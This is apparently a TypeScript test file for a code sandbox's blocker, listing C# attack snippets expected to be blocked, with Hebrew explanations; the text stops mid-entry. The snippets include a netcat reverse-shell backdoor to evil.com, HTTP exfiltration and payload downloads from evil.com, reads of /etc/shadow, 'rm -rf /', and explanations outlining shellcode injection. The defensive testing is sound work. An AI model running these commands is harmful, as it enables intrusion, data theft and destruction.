/**
 * C# Security Attack Vectors
 *
 * C# / .NET has a vast surface for attacks: process spawning, P/Invoke
 * (calling raw native code), unsafe blocks, reflection, Roslyn dynamic
 * compilation, deserialization gadgets, and AppDomain/AssemblyLoadContext
 * tricks. Binary / memory hacking is especially dangerous in C# because
 * the language exposes pointers, fixed buffers, stackalloc, and
 * Marshal.* APIs that can read/write arbitrary memory.
 *
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const csharpTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND / PROCESS EXECUTION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Process.Start (shell)',
    code: `using System.Diagnostics;
class Program {
  static void Main() {
    Process.Start("/bin/sh", "-c whoami");
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודת Shell ישירה

      איך תוקפים משתמשים בזה:
      Process.Start הוא המקביל של ‎Runtime.exec‎ ב־.NET -
      הוא מפעיל תהליכים מקוריים, כולל shells, עם גישה מלאה
      למערכת ההפעלה של השרת.

      השפעה בעולם האמיתי:
      - יצירת reverse shell ותנועה רוחבית
      - קריאת ‎/etc/passwd‎ ושליפת מפתחות SSH
      - מעבר מאפליקציות Web לתוך רשתות פנימיות
    `,
  },
  {
    name: 'C#: ProcessStartInfo + UseShellExecute',
    code: `using System.Diagnostics;
class Program {
  static void Main() {
    var psi = new ProcessStartInfo("cmd.exe", "/c dir") { UseShellExecute = true };
    Process.Start(psi);
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הפעלת Shell דרך ProcessStartInfo

      איך תוקפים משתמשים בזה:
      ProcessStartInfo מאפשר לשלוט בניתוב פלט/קלט, משתני
      סביבה והרשאות. כאשר UseShellExecute=true, ה־Shell של
      מערכת ההפעלה מפרש את מחרוזת הארגומנטים - מה שעלול לאפשר
      command injection.
    `,
  },
  {
    name: 'C#: Process.Start with redirected stdout',
    code: `using System.Diagnostics;
class Program {
  static void Main() {
    var p = new Process();
    p.StartInfo = new ProcessStartInfo("cat", "/etc/shadow") { RedirectStandardOutput = true, UseShellExecute = false };
    p.Start();
    System.Console.WriteLine(p.StandardOutput.ReadToEnd());
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הפעלת תהליך ושליפת stdout

      איך תוקפים משתמשים בזה:
      תפיסת stdout מתהליך שהופעל מאפשרת לתוקפים להוציא החוצה
      תוכן של קבצים רגישים, למשל ‎/etc/shadow‎ או ‎/etc/passwd‎,
      או פלט של כלי מערכת כמו id, whoami ו־env.
    `,
  },
  {
    name: 'C#: Thread to bypass scanner',
    code: `using System.Threading;
class Program {
  static void Main() {
    new Thread(() => System.Diagnostics.Process.Start("rm", "-rf /")).Start();
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודה בתוך Thread

      איך תוקפים משתמשים בזה:
      עטיפת Process.Start בתוך Thread חדש יכולה לעקוף סורקי
      מחרוזות נאיביים, ולהריץ את הפקודה בצורה אסינכרונית כך
      שהקריאה המקורית חוזרת כ"הצלחה" לפני שהנזק מזוהה.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: File.ReadAllText',
    code: `using System.IO;
class Program {
  static void Main() {
    System.Console.WriteLine(File.ReadAllText("/etc/passwd"));
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: גניבת קובץ בשורה אחת

      איך תוקפים משתמשים בזה:
      File.ReadAllText היא הדרך הקלאסית לקרוא קובץ רגיש ב־C#.
      ‎/etc/passwd‎, פרטי AWS, קבצי kube ומפתחות פרטיים יכולים
      להיקרא באמצעות קריאה אחת בלבד.
    `,
  },
  {
    name: 'C#: File.WriteAllText backdoor',
    code: `using System.IO;
class Program {
  static void Main() {
    File.WriteAllText("/tmp/backdoor.sh", "#!/bin/sh\\nnc evil.com 4444 -e /bin/sh");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: שתילת Backdoor

      איך תוקפים משתמשים בזה:
      File.WriteAllText משמשת לשתילת web shells, משימות cron
      או קבצי systemd לצורך התמדה במערכת. בשילוב עם Process.Start
      היא יוצרת שרשרת RCE מלאה.
    `,
  },
  {
    name: 'C#: FileStream raw read',
    code: `using System.IO;
class Program {
  static void Main() {
    using var fs = new FileStream("/etc/shadow", FileMode.Open);
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: גישה נמוכה לקבצים עם FileStream

      איך תוקפים משתמשים בזה:
      FileStream היא מחלקת הבסיס לפעולות קלט/פלט על קבצים ב־.NET.
      תוקפים משתמשים בה לגישה ברמת bytes - שימושי לקריאת סודות
      בינאריים או לכתיבת payloads בנויים במיוחד.
    `,
  },
  {
    name: 'C#: StreamReader on path',
    code: `using System.IO;
class Program {
  static void Main() {
    using var r = new StreamReader("/etc/passwd");
    System.Console.WriteLine(r.ReadToEnd());
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: גישה לקבצים דרך StreamReader

      איך תוקפים משתמשים בזה:
      StreamReader היא אחת הדרכים הנפוצות ביותר שבה מפתחי C#
      קוראים קבצי טקסט - ולכן גם אחת הדרכים הנפוצות שבה תוקפים
      עושים זאת.
    `,
  },
  {
    name: 'C#: Directory.GetFiles',
    code: `using System.IO;
class Program {
  static void Main() {
    foreach (var f in Directory.GetFiles("/", "*.key", SearchOption.AllDirectories))
      System.Console.WriteLine(f);
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: סריקה רקורסיבית של מערכת הקבצים

      איך תוקפים משתמשים בזה:
      Directory.GetFiles עם AllDirectories סורק את כל מערכת
      הקבצים ומחפש קבצים כמו ‎*.key‎, ‎*.pem‎, id_rsa ועוד.
    `,
  },
  {
    name: 'C#: File.Delete',
    code: `using System.IO;
class Program {
  static void Main() {
    File.Delete("/var/log/auth.log");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: מחיקת לוגים וטשטוש עקבות

      איך תוקפים משתמשים בזה:
      מחיקת קבצי לוג היא צעד אנטי־פורנזי קלאסי אחרי חדירה.
      File.Delete ו־Directory.Delete הם נקודות הכניסה לכך ב־.NET.
    `,
  },
  {
    name: 'C#: BinaryReader reads bytes',
    code: `using System.IO;
class Program {
  static void Main() {
    using var br = new BinaryReader(File.OpenRead("/etc/passwd"));
    var bytes = br.ReadBytes(1024);
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: קריאת קבצים בינאריים

      איך תוקפים משתמשים בזה:
      BinaryReader מתאים במיוחד לקבצים שאינם טקסטואליים, כמו
      keystores, מסדי נתונים של סיסמאות וקבצי assembly מקומפלים.
    `,
  },
  {
    name: 'C#: MemoryMappedFile',
    code: `using System.IO.MemoryMappedFiles;
class Program {
  static void Main() {
    var mmf = MemoryMappedFile.CreateFromFile("/etc/passwd");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: גישה לקובץ ממופה־זיכרון

      איך תוקפים משתמשים בזה:
      MemoryMappedFile ממפה קובץ ישירות לזיכרון ומאפשר קריאה
      וכתיבה ללא העתקה. משתמשים בזה כדי לעקוף audit hooks
      שנמצאים בשכבות API גבוהות יותר של מערכת הקבצים.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: HttpClient exfiltration',
    code: `using System.Net.Http;
class Program {
  static void Main() {
    var c = new HttpClient();
    c.PostAsync("http://evil.com/x", new StringContent("secret")).Wait();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: הוצאת נתונים דרך HTTP

      איך תוקפים משתמשים בזה:
      HttpClient הוא API ה־HTTP המודרני של .NET. תוקפים שולחים
      נתונים גנובים ב־POST לשרת שבשליטתם, כשהתעבורה נראית כמו
      תעבורה יוצאת רגילה.
    `,
  },
  {
    name: 'C#: WebClient download',
    code: `using System.Net;
class Program {
  static void Main() {
    new WebClient().DownloadFile("http://evil.com/payload.exe", "/tmp/p");
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: הורדת Payload מרוחק

      איך תוקפים משתמשים בזה:
      WebClient.DownloadFile הוא dropper קלאסי לשלב שני. התבנית
      "להוריד ואז להריץ" היא אחת מטכניקות התקנת RAT הנפוצות
      ביותר בעולם האמיתי.
    `,
  },
  {
    name: 'C#: TcpClient reverse shell',
    code: `using System.Net.Sockets;
class Program {
  static void Main() {
    var c = new TcpClient("evil.com", 4444);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: Reverse Shell באמצעות TCP גולמי

      איך תוקפים משתמשים בזה:
      TcpClient יוצר חיבור TCP יוצא. בשילוב עם
      Process.Start("/bin/sh") וניתוב streams הוא הופך ל־reverse
      shell מלא.
    `,
  },
  {
    name: 'C#: TcpListener bind shell',
    code: `using System.Net;
using System.Net.Sockets;
class Program {
  static void Main() {
    var l = new TcpListener(IPAddress.Any, 9999);
    l.Start();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: Bind Shell Listener

      איך תוקפים משתמשים בזה:
      TcpListener הופך את המחשב שנפרץ לשרת שהתוקף יכול להתחבר
      אליו מאוחר יותר. בדרך כלל משתמשים בזה לצורך התמדה.
    `,
  },
  {
    name: 'C#: Socket primitive',
    code: `using System.Net.Sockets;
using System.Net;
class Program {
  static void Main() {
    var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    s.Connect(new IPEndPoint(IPAddress.Loopback, 22));
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: בדיקת פורטים עם Socket גולמי

      איך תוקפים משתמשים בזה:
      Socket הוא הפרימיטיב ברמה הנמוכה ביותר - מושלם לסריקת
      פורטים ברשת הפנימית מתוך אפליקציה שכבר נפרצה.
    `,
  },
  {
    name: 'C#: Dns lookup',
    code: `using System.Net;
class Program {
  static void Main() {
    System.Console.WriteLine(Dns.GetHostEntry("evil.com").AddressList[0]);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: איסוף מודיעין DNS / הוצאת מידע דרך DNS

      איך תוקפים משתמשים בזה:
      בקשות DNS מותרות לעיתים גם בסביבות שבהן HTTP חסום, ולכן
      DNS יכול לשמש כערוץ סמוי להוצאת מידע החוצה.
    `,
  },
  {
    name: 'C#: SmtpClient mail relay',
    code: `using System.Net.Mail;
class Program {
  static void Main() {
    new SmtpClient("evil.com").Send("a@a", "b@b", "x", "y");
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: הוצאת מידע דרך SMTP

      איך תוקפים משתמשים בזה:
      שליחת דואר דרך שרת SMTP שבשליטת התוקף היא ערוץ סמוי נוסף
      להוצאת מידע, שיכול לעקוף מסנני HTTP יוצאים נפוצים.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // REFLECTION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Type.GetType + Invoke',
    code: `class Program {
  static void Main() {
    var t = System.Type.GetType("System.Diagnostics.Process");
    t.GetMethod("Start", new[]{typeof(string)}).Invoke(null, new object[]{"id"});
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: הרצת פקודות באמצעות Reflection

      איך תוקפים משתמשים בזה:
      Reflection עוקף ניתוח סטטי: המחלקה Process לא מופיעה
      ישירות בקוד, אלא רק כמחרוזת. משפחות רבות של נוזקות .NET
      משתמשות בדיוק בתבנית הזו כדי להתחמק מאנטי־וירוס.
    `,
  },
  {
    name: 'C#: Activator.CreateInstance',
    code: `class Program {
  static void Main() {
    var t = System.Type.GetType("System.Net.WebClient");
    var c = System.Activator.CreateInstance(t);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: בניית אובייקטים דינמית

      איך תוקפים משתמשים בזה:
      Activator.CreateInstance בונה אובייקטים מתוך Type reference -
      כך תוקפים יכולים ליצור WebClient, Process או כל מחלקה אחרת
      בלי להזכיר אותה ישירות בקוד המקור.
    `,
  },
  {
    name: 'C#: Assembly.Load(byte[])',
    code: `using System.Reflection;
class Program {
  static void Main() {
    Assembly.Load(new byte[]{0x4d,0x5a});
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: הזרקת Assembly בזיכרון

      איך תוקפים משתמשים בזה:
      Assembly.Load(byte[]) טוען assembly של .NET מתוך buffer
      גולמי של bytes, בלי לגעת בדיסק. זה בסיס לנוזקות .NET
      fileless ולטכניקת execute-assembly של Cobalt Strike.
    `,
  },
  {
    name: 'C#: Assembly.LoadFrom remote',
    code: `using System.Reflection;
class Program {
  static void Main() {
    Assembly.LoadFrom("http://evil.com/x.dll");
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: טעינת Assembly מרוחק

      איך תוקפים משתמשים בזה:
      LoadFrom יכול לטעון assemblies דרך HTTP, להוריד ולהריץ
      קוד .NET שרירותי משרת שבשליטת התוקף.
    `,
  },
  {
    name: 'C#: BindingFlags.NonPublic',
    code: `using System.Reflection;
class Program {
  static void Main() {
    var m = typeof(string).GetMethod("FastAllocateString", BindingFlags.Static|BindingFlags.NonPublic);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: Reflection על members פרטיים

      איך תוקפים משתמשים בזה:
      BindingFlags.NonPublic חושף members פרטיים ופנימיים,
      ומאפשר לתוקפים לקרוא APIs שלא נועדו להיות נגישים,
      כולל internals רגישים מבחינת אבטחה.
    `,
  },
  {
    name: 'C#: DynamicMethod IL emission',
    code: `using System.Reflection.Emit;
class Program {
  static void Main() {
    var dm = new DynamicMethod("x", typeof(void), null);
    var il = dm.GetILGenerator();
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: יצירת IL בזמן ריצה

      איך תוקפים משתמשים בזה:
      Reflection.Emit / ILGenerator בונים bytecode מסוג CIL
      בזמן ריצה - המקביל ב־C# לכתיבת payload דרך JIT, וזה
      מנגנון נפוץ שבו obfuscators מסתירים payloads.
    `,
  },
  {
    name: 'C#: AppDomain access',
    code: `class Program {
  static void Main() {
    var d = System.AppDomain.CurrentDomain;
    foreach (var a in d.GetAssemblies()) System.Console.WriteLine(a.FullName);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: מיפוי AppDomain

      איך תוקפים משתמשים בזה:
      AppDomain חושף כל assembly שנטען - שלב reconnaissance
      מצוין למציאת types מעניינים שאפשר לתקוף באמצעות Reflection.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ROSLYN / DYNAMIC CODE COMPILATION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: CSharpScript.EvaluateAsync',
    code: `using Microsoft.CodeAnalysis.CSharp.Scripting;
class Program {
  static void Main() {
    CSharpScript.EvaluateAsync("System.Diagnostics.Process.Start(\\"id\\")").Wait();
  }
}`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: RCE דרך Roslyn Scripting

      איך תוקפים משתמשים בזה:
      Microsoft.CodeAnalysis.CSharp.Scripting מקמפל ומריץ C#
      שרירותי בזמן ריצה. זה ה־eval() של C#, ונתיב ישיר להרצת
      קוד שרירותית.
    `,
  },
  {
    name: 'C#: CSharpCodeProvider.CompileAssemblyFromSource',
    code: `using Microsoft.CSharp;
using System.CodeDom.Compiler;
class Program {
  static void Main() {
    var p = new CSharpCodeProvider();
    p.CompileAssemblyFromSource(new CompilerParameters(), "class X{}");
  }
}`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: קומפיילר CodeDom ישן

      איך תוקפים משתמשים בזה:
      ה־pipeline הקלאסי של Microsoft.CSharp + CodeDom מקמפל
      C# מתוך מחרוזת. הוא קדם ל־Roslyn, אבל עדיין נפוץ ב־payloads
      ישנים בסגנון PowerShell.
    `,
  },
  {
    name: 'C#: dynamic + ExpandoObject',
    code: `using System.Dynamic;
class Program {
  static void Main() {
    dynamic e = new ExpandoObject();
    e.Run = (System.Action)(() => System.Diagnostics.Process.Start("id"));
    e.Run();
  }
}`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: Dispatch דינמי דרך DLR

      איך תוקפים משתמשים בזה:
      Dynamic Language Runtime פותר קריאות בזמן ריצה, וכך מקשה
      על כלי ניתוח סטטי שמחפשים קריאות ידועות למתודות מסוכנות.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // DESERIALIZATION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: BinaryFormatter.Deserialize',
    code: `using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
class Program {
  static void Main() {
    var bf = new BinaryFormatter();
    bf.Deserialize(new MemoryStream(new byte[]{0}));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: Deserialization עם BinaryFormatter ‏(RCE)

      איך תוקפים משתמשים בזה:
      BinaryFormatter הוא המקביל של ObjectInputStream ב־Java -
      מקור להמון חולשות RCE. Microsoft סימנה אותו רשמית
      כ"מסוכן", ו־YSoSerial.NET מייצר payloads מוכנים למחלקה הזו.
    `,
  },
  {
    name: 'C#: SoapFormatter.Deserialize',
    code: `using System.Runtime.Serialization.Formatters.Soap;
using System.IO;
class Program {
  static void Main() {
    var f = new SoapFormatter();
    f.Deserialize(new MemoryStream(new byte[]{0}));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: Deserialization של SOAP

      איך תוקפים משתמשים בזה:
      SoapFormatter סובל מאותה בעיית gadget-chain כמו
      BinaryFormatter, ומנוצל באותה שיטה.
    `,
  },
  {
    name: 'C#: ObjectStateFormatter (ViewState)',
    code: `using System.Web.UI;
class Program {
  static void Main() {
    new ObjectStateFormatter().Deserialize("AAEAAAD/////");
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: Deserialization של ASP.NET ViewState

      איך תוקפים משתמשים בזה:
      ObjectStateFormatter מנתח ASP.NET ViewState. כאשר
      machine key דולף או חלש, תוקפים יכולים לבנות payloads
      של ViewState ל־RCE מלא - ראו CVE-2017-9248 ורבים נוספים.
    `,
  },
  {
    name: 'C#: NetDataContractSerializer',
    code: `using System.Runtime.Serialization;
using System.IO;
class Program {
  static void Main() {
    new NetDataContractSerializer().Deserialize(new MemoryStream(new byte[]{0}));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: Gadget Chain דרך NetDataContractSerializer

      איך תוקפים משתמשים בזה:
      NetDataContractSerializer מטמיע שמות types מלאים בפלט
      שלו ופותר אותם בזמן deserialize, ולכן הוא primitive
      משמעותי ל־RCE.
    `,
  },
  {
    name: 'C#: TypeNameHandling abuse hint',
    code: `class Program {
  static void Main() {
    var s = "{\\"$type\\":\\"System.Diagnostics.Process\\"}";
    var t = Newtonsoft.Json.TypeNameHandling.All;
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: RCE דרך Json.NET TypeNameHandling

      איך תוקפים משתמשים בזה:
      כאשר Json.NET מוגדר עם TypeNameHandling שאינו None,
      מאפיין "$type" בתוך JSON יכול ליצור types שרירותיים -
      שרשרת gadget קלאסית ל־Process או למחלקות מסוכנות אחרות.
      הרבה CVEs אמיתיים, למשל CVE-2019-18935, פגעו בדיוק בתבנית הזו.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // BINARY / UNSAFE / NATIVE - the hacker's playground
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: unsafe pointer write',
    code: `class Program {
  static unsafe void Main() {
    int x = 0;
    int* p = &x;
    *p = 0x41414141;
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: מניפולציה של מצביעים עם unsafe

      איך תוקפים משתמשים בזה:
      בלוקים של unsafe מאפשרים ל־C# לעבוד עם מצביעים גולמיים
      כמו ב־C. בשילוב עם stackalloc / fixed זה מאפשר stack
      smashing, ניצול בסגנון ROP וקריאה/כתיבה שרירותית לזיכרון -
      הליבה של binary exploitation.
    `,
  },
  {
    name: 'C#: stackalloc buffer',
    code: `class Program {
  static unsafe void Main() {
    byte* buf = stackalloc byte[1024];
    for (int i = 0; i < 4096; i++) buf[i] = 0x90; // overflow!
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: Buffer Overflow על ה־Stack

      איך תוקפים משתמשים בזה:
      stackalloc מקצה זיכרון על ה־stack בלי בדיקות גבולות.
      כתיבה מעבר לסוף ה־buffer דורסת return addresses -
      stack smashing קלאסי להרצת קוד native.
    `,
  },
  {
    name: 'C#: fixed pointer pinning',
    code: `class Program {
  static unsafe void Main() {
    byte[] arr = new byte[8];
    fixed (byte* p = arr) {
      *(long*)p = 0xdeadbeef;
    }
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: Pinning ו־Type Punning

      איך תוקפים משתמשים בזה:
      fixed מקבע זיכרון managed וחושף אותו כמצביע גולמי.
      המרה ל־(long*) היא type punning - דרך לעקוף type safety
      ולבנות payloads בינאריים.
    `,
  },
  {
    name: 'C#: Marshal.AllocHGlobal',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    var p = Marshal.AllocHGlobal(4096);
    Marshal.Copy(new byte[]{0x90,0x90,0xc3}, 0, p, 3);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: טעינת Shellcode ל־Native Heap

      איך תוקפים משתמשים בזה:
      Marshal.AllocHGlobal מקצה זיכרון unmanaged, ו־Marshal.Copy
      מעתיק אליו bytes. שתי שורות נוספות - VirtualProtect
      ו־GetDelegateForFunctionPointer - וכבר אפשר להריץ shellcode
      בתוך תהליך .NET. זה המתכון הקלאסי של execute-shellcode-from-C#.
    `,
  },
  {
    name: 'C#: GCHandle.Alloc Pinned',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    var h = GCHandle.Alloc(new byte[16], GCHandleType.Pinned);
    var addr = h.AddrOfPinnedObject();
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: חשיפת כתובת של Buffer מקובע

      איך תוקפים משתמשים בזה:
      GCHandle.Alloc(Pinned) מונע מה־GC להזיז אובייקט, כך שאפשר
      לקבל מצביע native יציב - תנאי מקדים להעברת buffers ל־P/Invoke
      או ל־shellcode.
    `,
  },
  {
    name: 'C#: Marshal.GetDelegateForFunctionPointer',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    var ptr = new System.IntPtr(0x12345678);
    var d = Marshal.GetDelegateForFunctionPointer<System.Action>(ptr);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: השתלטות דרך Function Pointer

      איך תוקפים משתמשים בזה:
      GetDelegateForFunctionPointer הופך כל IntPtr ל־delegate
      שניתן לקרוא לו - מכוונים אותו ל־shellcode בזיכרון שהוקצה
      עם AllocHGlobal ומפעילים. הרצת shellcode ישירה ב־.NET טהור.
    `,
  },
  {
    name: 'C#: Span<byte> + stackalloc',
    code: `using System;
class Program {
  static void Main() {
    Span<byte> s = stackalloc byte[1024];
    s[0] = 0x41;
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: Stack Buffer עטוף ב־Span

      איך תוקפים משתמשים בזה:
      Span<byte> מעל stackalloc הוא המקביל המודרני ל־buffer
      של C. הוא נפוץ בקוד עתיר ביצועים - וגם בניצולי memory
      corruption.
    `,
  },
  {
    name: 'C#: Unsafe.As reinterpret cast',
    code: `using System.Runtime.CompilerServices;
class Program {
  static void Main() {
    int x = 0;
    long y = Unsafe.As<int,long>(ref x);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: Type Punning דרך Unsafe.As

      איך תוקפים משתמשים בזה:
      System.Runtime.CompilerServices.Unsafe.As מפרש reference
      managed כ־type אחר - ועוקף לחלוטין את מערכת הטיפוסים.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // P/INVOKE / NATIVE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: DllImport kernel32 LoadLibrary',
    code: `using System.Runtime.InteropServices;
class Program {
  [DllImport("kernel32.dll")] static extern System.IntPtr LoadLibrary(string n);
  static void Main() { LoadLibrary("evil.dll"); }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: Win32 LoadLibrary דרך P/Invoke

      איך תוקפים משתמשים בזה:
      DllImport מגדיר binding של P/Invoke ל־API native.
      LoadLibrary טוען DLLs של התוקף לתוך התהליך - הצעד הראשון
      במתקפות DLL hijacking ו־side-loading.
    `,
  },
  {
    name: 'C#: DllImport libc system()',
    code: `using System.Runtime.InteropServices;
class Program {
  [DllImport("libc")] static extern int system(string c);
  static void Main() { system("id"); }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: libc system() דרך P/Invoke

      איך תוקפים משתמשים בזה:
      P/Invoke אל libc.system() מריץ פקודות shell בלינוקס.
      זה עוקף בדיקות ברמת .NET להרצת פקודות, כי לא נוגעים בכלל
      ב־Process API מנוהל.
    `,
  },
  {
    name: 'C#: DllImport VirtualAlloc',
    code: `using System.Runtime.InteropServices;
class Program {
  [DllImport("kernel32.dll")] static extern System.IntPtr VirtualAlloc(System.IntPtr a, uint s, uint t, uint p);
  static void Main() { VirtualAlloc(System.IntPtr.Zero, 4096, 0x1000, 0x40); }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: עמוד RWX עבור Shellcode

      איך תוקפים משתמשים בזה:
      VirtualAlloc עם PAGE_EXECUTE_READWRITE ‏(0x40) יוצר אזור
      זיכרון שניתן להרצה. בשילוב עם WriteProcessMemory ו־CreateThread
      זו שרשרת הזרקת shellcode הקלאסית ב־Windows.
    `,
  },
  {
    name: 'C#: NativeLibrary.Load',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    NativeLibrary.Load("/tmp/evil.so");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: טעינת Native Library חוצת־פלטפורמות

      איך תוקפים משתמשים בזה:
      NativeLibrary.Load, שנוסף ב־.NET Core 3, טוען ספרייה native
      לפי path בכל מערכת הפעלה - תחליף מודרני ל־LoadLibrary/dlopen
      דרך P/Invoke.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CLASSLOADER / ASSEMBLY LOADING
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: AssemblyLoadContext load',
    code: `using System.Runtime.Loader;
class Program {
  static void Main() {
    AssemblyLoadContext.Default.LoadFromAssemblyPath("/tmp/evil.dll");
  }
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 התקפה: השתלטות דרך AssemblyLoadContext

      איך תוקפים משתמשים בזה:
      AssemblyLoadContext הוא טוען ה־assemblies המודרני של .NET.
      טעינת DLLs של התוקף לתוך context ברירת המחדל מאפשרת להם
      להחליף types קיימים ולהריץ קוד בשימוש הראשון.
    `,
  },
  {
    name: 'C#: AppDomain.CreateDomain',
    code: `class Program {
  static void Main() {
    var ad = System.AppDomain.CreateDomain("evil");
  }
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 התקפה: בריחה מ־Sandbox דרך AppDomain

      איך תוקפים משתמשים בזה:
      יצירת AppDomain חדש ב־.NET Framework הישן עם הרשאות משוחררות
      הייתה טכניקת sandbox escape כבר מהגרסאות הראשונות של .NET.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Environment.Exit DoS',
    code: `class Program {
  static void Main() {
    System.Environment.Exit(0);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: DoS באמצעות סיום תהליך

      איך תוקפים משתמשים בזה:
      Environment.Exit הורג את תהליך השרת מיד, ומפיל את השירות
      עבור כל המשתמשים האחרים - denial of service בשורה אחת.
    `,
  },
  {
    name: 'C#: Environment.GetEnvironmentVariables',
    code: `class Program {
  static void Main() {
    foreach (var k in System.Environment.GetEnvironmentVariables().Keys)
      System.Console.WriteLine(k);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: גניבת משתני סביבה

      איך תוקפים משתמשים בזה:
      משתני סביבה מכילים לעיתים קרובות סודות כמו
      AWS_SECRET_ACCESS_KEY,‏ DATABASE_URL ו־API tokens. שליפה שלהם
      היא אחד הדברים הראשונים שתוקף אמיתי עושה אחרי גישה ראשונית.
    `,
  },
  {
    name: 'C#: Registry.GetValue',
    code: `using Microsoft.Win32;
class Program {
  static void Main() {
    var v = Registry.GetValue("HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\X", "Y", null);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: קריאת Windows Registry

      איך תוקפים משתמשים בזה:
      ה־Windows registry מכיל credentials, נתיבי התקנה והגדרות.
      Microsoft.Win32.Registry הוא ה־API הישיר של .NET לקריאה
      וכתיבה שלו.
